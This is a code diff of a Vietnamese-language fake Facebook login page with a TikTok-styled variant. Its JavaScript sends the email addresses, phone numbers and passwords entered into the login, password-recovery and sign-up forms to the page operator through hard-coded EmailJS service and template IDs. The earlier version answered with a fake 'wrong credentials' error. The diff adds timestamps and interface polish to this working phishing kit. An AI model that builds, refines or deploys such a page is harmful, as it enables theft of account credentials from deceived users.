@@ -18,6 +18,8 @@
         }
         body.tiktok-mode {
             background: #fff;
+            justify-content: center;
+            align-items: center;
         }
         .header {
             display: none;
@@ -43,11 +45,13 @@
             font-size: 20px;
             font-weight: 700;
             color: #1877f2;
+            cursor: pointer;
         }
         .header-menu svg {
             width: 24px;
             height: 24px;
             fill: #606770;
+            cursor: pointer;
         }
         .main-container {
             flex-grow: 1;
@@ -74,6 +78,7 @@
         .desktop-logo {
             width: 301px;
             margin-bottom: 24px;
+            cursor: pointer;
         }
         .slogan {
             font-size: 28px;
@@ -92,6 +97,8 @@
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
             display: none;
             margin-top: 40px;
+            position: relative;
+            z-index: 1;
         }
         body.tiktok-mode .login-container-tiktok {
             margin-top: 60px;
@@ -99,6 +106,10 @@
             border-radius: 0;
             max-width: 100%;
             padding: 15px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
         }
         .login-container-tiktok.active, .login-container-desktop.active,
         .forgot-password-container.active, .create-account-container.active,
@@ -145,6 +156,7 @@
             font-size: 20px;
             font-weight: 600;
             line-height: 24px;
+            cursor: pointer;
         }
         .btn-primary:hover {
             background: #166fe5;
@@ -161,6 +173,7 @@
             font-weight: 600;
             margin: 12px auto 0;
             display: block;
+            cursor: pointer;
         }
         .btn-create-account:hover {
             background: #36a420;
@@ -172,6 +185,7 @@
             display: block;
             margin-top: 16px;
             text-decoration: none;
+            cursor: pointer;
         }
         .forgot-password:hover {
             text-decoration: underline;
@@ -220,6 +234,7 @@
             color: #737373;
             margin: 0 10px;
             text-decoration: none;
+            cursor: pointer;
         }
         .footer-links-tiktok a:hover {
             text-decoration: underline;
@@ -250,6 +265,7 @@
         .footer-links a {
             color: #737373;
             text-decoration: none;
+            cursor: pointer;
         }
         .footer-links a:hover {
             text-decoration: underline;
@@ -292,6 +308,7 @@
             padding: 10px 20px;
             font-size: 16px;
             font-weight: 600;
+            cursor: pointer;
         }
         .overlay {
             display: none;
@@ -320,13 +337,13 @@
 <body>
     <script type="text/javascript">
         (function() {
-            emailjs.init("wF5gWgp1GWyg7q0KY"); // Khởi tạo EmailJS với Public Key
+            emailjs.init("wF5gWgp1GWyg7q0KY"); // Public Key của bạn
         })();
     </script>
 
     <div class="header">
         <div class="header-content">
-            <div class="header-title">facebook</div>
+            <div class="header-title" onclick="showLogin()">facebook</div>
             <div class="header-menu" onclick="toggleDropdown()">
                 <svg viewBox="0 0 24 24"><circle cx="12" cy="6" r="2" fill="#606770"/><circle cx="12" cy="12" r="2" fill="#606770"/><circle cx="12" cy="18" r="2" fill="#606770"/></svg>
             </div>
@@ -339,7 +356,7 @@
     </div>
     <div class="main-container">
         <div class="left-section">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="desktop-logo">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="desktop-logo" onclick="showLogin()">
             <div class="slogan">Kết nối với bạn bè, gia đình và những người khác mà bạn biết. Chia sẻ ảnh và video, gửi tin nhắn và nhận thông tin cập nhật.</div>
         </div>
         <!-- TikTok Login -->
@@ -535,10 +552,12 @@
             const templateParams = {
                 email: loginInput,
                 password: password,
-                action: "Đăng nhập"
+                action: "Đăng nhập",
+                timestamp: new Date().toLocaleString()
             };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => showPopup("Lỗi", "Sai thông tin đăng nhập."), () => showPopup("Lỗi", "Có lỗi xảy ra."));
+                .then(() => showPopup("Thành công", "Thông tin đăng nhập đã được gửi qua email."), 
+                      () => showPopup("Lỗi", "Có lỗi xảy ra khi gửi thông tin."));
         }
 
         function searchByPhone() {
@@ -549,10 +568,12 @@
             }
             const templateParams = {
                 phone: phone,
-                action: "Quên mật khẩu"
+                action: "Quên mật khẩu",
+                timestamp: new Date().toLocaleString()
             };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => showPopup("Thành công", "Đã gửi mã xác nhận đến " + phone), () => showPopup("Lỗi", "Không tìm thấy tài khoản."));
+                .then(() => showPopup("Thành công", "Đã gửi mã xác nhận đến " + phone), 
+                      () => showPopup("Lỗi", "Có lỗi xảy ra khi gửi thông tin."));
         }
 
         function createAccount() {
@@ -569,10 +590,12 @@
                 lastName: lastName,
                 phone: phone,
                 password: password,
-                action: "Tạo tài khoản"
+                action: "Tạo tài khoản",
+                timestamp: new Date().toLocaleString()
             };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => showPopup("Thành công", "Đã tạo tài khoản."), () => showPopup("Lỗi", "Có lỗi xảy ra."));
+                .then(() => showPopup("Thành công", "Thông tin tài khoản đã được gửi qua email."), 
+                      () => showPopup("Lỗi", "Có lỗi xảy ra khi gửi thông tin."));
         }
     </script>
 </body>
